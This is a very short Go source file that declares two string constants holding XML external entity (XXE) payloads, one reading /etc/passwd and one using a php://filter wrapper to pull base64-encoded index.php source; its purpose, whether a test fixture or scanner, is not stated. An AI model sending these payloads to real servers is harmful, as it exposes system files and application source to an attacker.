package main
import _ "net/http"
const x = `<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
const y = `<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>`
